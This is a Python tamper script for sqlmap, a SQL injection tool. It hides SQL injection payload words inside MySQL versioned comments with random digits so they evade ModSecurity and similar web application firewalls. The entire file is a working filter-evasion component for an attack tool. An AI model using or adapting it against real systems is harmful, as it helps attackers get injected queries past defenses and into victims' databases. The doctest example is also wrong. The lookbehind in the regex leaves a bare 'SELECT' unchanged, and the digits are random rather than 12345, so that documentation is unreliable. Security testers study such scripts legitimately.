#!/usr/bin/env python

"""
Copyright (c) 2006-2021 sqlmap developers (https://sqlmap.org/)
See the file 'LICENSE' for copying permission

author : Harshil Patel (https://github.com/HarshilPatel007)

__version__ : 0.2-dev
"""

import os
import re
import random
from lib.core.enums import DBMS
from lib.core.enums import PRIORITY
from lib.core.common import singleTimeWarnMessage

__priority__ = PRIORITY.HIGHER


def dependencies():
    singleTimeWarnMessage("this tamper script '%s' is only meant to be run against %s." % (os.path.basename(__file__).split(".")[0], DBMS.MYSQL))


def tamper(payload, **kwargs):
    """
    Mod Security Bypass.
    Technique : replace the word(s) with MySQL comment.

    >>> tamper('SELECT')
    '/*!12345SELECT*/'
    """

    retVal = payload
    
    ri1 = random.randint(0,9)
    ri2 = random.randint(0,9)
    ri3 = random.randint(0,9)
    ri4 = random.randint(0,9)
    ri5 = random.randint(0,9)

    if payload:
        retVal = re.sub(r"(?<=\W)(?P<word>[A-Za-z_]+)", r'/*!%s\1*/' %f"{ri1}{ri2}{ri3}{ri4}{ri5}", payload)

    return retVal
